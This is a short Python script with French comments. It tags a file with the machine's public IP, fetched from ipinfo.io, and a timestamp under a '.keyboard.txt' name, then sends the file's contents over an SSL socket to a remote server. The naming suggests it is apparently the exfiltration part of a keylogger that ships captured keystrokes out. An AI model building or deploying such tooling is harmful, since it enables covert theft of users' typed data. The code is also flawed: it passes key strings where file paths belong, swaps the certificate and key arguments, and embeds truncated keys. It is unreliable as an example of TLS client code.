import socket
import os
import ssl
import requests
import time
from datetime import datetime


PRIVATE_KEY_CLIENT = """-----BEGIN RSA PRIVATE KEY-----
MIICWwIBAAKBgHM9/
-----END RSA PRIVATE KEY-----
"""
PUBLIC_KEY_CLIENT = """-----BEGIN PUBLIC KEY-----
MIGeMA0GCSqGSIb3DQEBAQUAA4GMADCBiAKBgHM9/
-----END PUBLIC KEY-----
"""

# Fonction pour obtenir le nom du fichier avec l'adresse IP et la date
def get_filename():
    now = datetime.now()
    response = requests.get("https://ipinfo.io")
    ip_data = response.json()
    public_ip = ip_data.get('ip')
    filename = public_ip + "-" + now.strftime("%d-%m-%Y-%H:%M:%S") + ".keyboard.txt"
    return filename

# Fonction pour envoyer le fichier de manière sécurisée au serveur via une socket SSL
def send_file_securely(file_path, server_address, server_port):
    # Créer une socket TCP
    client_socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)

    # Créer un contexte SSL
    context = ssl.create_default_context(ssl.Purpose.CLIENT_AUTH)
    context.load_cert_chain(certfile=PRIVATE_KEY_CLIENT, keyfile=PUBLIC_KEY_CLIENT)

    # Établir une connexion sécurisée avec le serveur
    secure_socket = context.wrap_socket(client_socket, server_hostname=server_address)

    try:
        # Se connecter au serveur
        secure_socket.connect((server_address, server_port))

        # Envoyer le nom du fichier au serveur
        filename = get_filename()
        secure_socket.send(filename.encode())

        # Envoyer le contenu du fichier au serveur
        with open(file_path, "r") as file:
            file_data = file.read()
            secure_socket.sendall(file_data.encode())

        print("Fichier envoyé avec succès.")
    except Exception as e:
        print(f"Erreur lors de l'envoi du fichier : {e}")
    finally:
        # Fermer la connexion
        secure_socket.close()

if __name__ == "__main__":
    # Fichier à envoyer
    file_to_send = "chemin_du_fichier.txt"

    # Adresse du serveur
    server_address = "adresse_du_serveur"

    # Port du serveur
    server_port = 12345

    # Envoyer le fichier de manière sécurisée au serveur
    send_file_securely(file_to_send, server_address, server_port)
